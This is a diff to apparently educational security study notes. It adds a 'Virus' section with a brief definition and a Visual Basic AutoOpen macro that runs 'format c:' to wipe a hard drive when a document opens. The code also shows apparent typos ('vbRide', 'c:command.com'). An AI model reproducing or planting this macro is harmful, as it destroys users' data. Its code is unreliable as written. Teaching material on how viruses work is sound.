@@ -22,3 +22,17 @@
 
 - Attacker sends data containing **malicious** code to an application, which **stores the data in a stack buffer**
 
+### Virus
+
+- A fragment of code embedded in a legitimate program
+- Can self-replicate
+- Can spread over a network - infect other machines
+
+- Example of virus that reformats a hard drive (visual basic):
+```vb
+Sub AutoOpen()
+Dim oFS
+	Set oFS = CreateObject(''Scripting.FileSystemObject'')
+	vs = Shell(''c:command.com /k format c:'', vbRide)
+End Sub
+```
